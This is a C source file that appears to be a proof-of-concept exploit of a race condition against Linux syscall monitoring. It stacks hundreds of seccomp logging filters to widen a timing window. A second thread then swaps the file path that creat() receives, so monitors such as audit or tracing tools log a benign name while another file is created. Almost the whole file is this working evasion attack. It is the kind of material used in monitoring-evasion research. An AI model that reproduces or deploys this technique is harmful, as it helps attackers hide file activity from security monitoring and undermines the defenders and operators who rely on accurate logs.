#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
/* file flag */
#include <fcntl.h>
/* mmap */
#include <sys/mman.h>
/* string */
#include <string.h>
/* compile without -m32 for 64 bit call numbers */
#include <asm/unistd.h>      
#include <string.h>
#include <seccomp.h>
#include <assert.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#include <stddef.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/syscall.h>
#include <sys/prctl.h>

#ifndef SECCOMP_RET_KILL_PROCESS
#define SECCOMP_RET_KILL_PROCESS SECCOMP_RET_KILL
#endif

#define X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR \
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, \
                (offsetof(struct seccomp_data, arch))), \
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2), \
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, \
                 (offsetof(struct seccomp_data, nr))), \
        BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1), \
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)

#define X32_SYSCALL_BIT         0x40000000
#define FORCE_INLINE __attribute__((always_inline)) inline

#define FORCE_INLINE __attribute__((always_inline)) inline

#define handle_error_en(en, msg) \
  do { errno = en; perror(msg); exit(EXIT_FAILURE); } while (0)


static int page_size;
// the intended file to open, this can be anywhere you mount the fusefs file path
//static volatile char page[] = "/root/droplet/malicious_file";
static volatile char page[] = "benign_file";

static inline void 
busyloop(int overwrite_delay) 
{
  for (int i = 0; i < overwrite_delay; i++) {
    __asm__ volatile("" : "+g" (i) : :);
  }
}

/* simplified strcpy */
static volatile void 
write_char(char *string, int len) 
{
  for(int i = 0; i < len; i++) {
    page[i] = string[i];
  }
}

FORCE_INLINE int 
nanosleep_helper(long nsec) 
{
  struct timespec req, rem;
  req.tv_sec = 0;
  req.tv_nsec = nsec;

  ssize_t ret;
   
  asm volatile
  (
    "syscall"
    : "=a" (ret)
    /*                      RDI      RSI     */
    : "0"(__NR_nanosleep), "D"(&req), "S"(&rem)
    : "rcx", "r11", "memory"
  );
  return ret;
}

static inline void 
flush(void *p) 
{
    asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static void *
thread_start(void *arg)
{
  // let monitoring software report a local path 
  char fakename[] = "malicious_file";
  // can also pick the path in the fusefs path
  //char fakename[] = "/root/droplet/benign_file";
  asm volatile("mfence");
  write_char(fakename, sizeof(fakename));
  asm volatile("mfence");
  flush(page);
}

static int
seccomp(unsigned int operation, unsigned int flags, void *args)
{
  return syscall(__NR_seccomp, operation, flags, args);
}

static void
install_filter(void) 
{
  struct sock_filter filter[] = {
    /* Load architecture */

    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
            (offsetof(struct seccomp_data, arch))),

    /* Kill the process if the architecture is not what we expect */

    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),

    /* Load system call number */

    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
             (offsetof(struct seccomp_data, nr))),

    /* Kill the process if this is an x32 system call (bit 30 is set) */

    BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

    /* Some filter rules will later be inserted here */

    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_LOG),
  };

  struct sock_fprog prog = {
    .len = (unsigned short) (sizeof(filter) / sizeof(filter[0])),
    .filter = filter,
  };

  if (seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog) == -1)
    perror("seccomp");
}

/*
 * We will trigger syscall with benign file and overwrite it with malicious
 * file*/
int
main(int argc, char *argv[]) 
{
  int s;
  pthread_t thread;
  // seccomp install
  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0))
    perror("prctl");

  int i;
  for (i = 0; i < 500; i++) {
    install_filter();
  }

  /* start new thread */
  s = pthread_create(&thread, NULL, &thread_start, NULL);
  if (s != 0)
    handle_error_en(s, "pthread_create");

  /* busy delay */
  /* syscall openat */
  int myfd = 0;
  //myfd = open(page, O_CREAT|O_RDWR|O_DIRECT, 0640);
  myfd = creat(page, S_IRUSR | S_IWUSR | S_IXUSR);
  if (myfd < 0) 
    handle_error_en(myfd, "open failure");
 
  /* wait for thread to finish */
  s = pthread_join(thread, NULL);
  if (s != 0)
    handle_error_en(s, "pthread_join");
  exit(EXIT_SUCCESS);
}
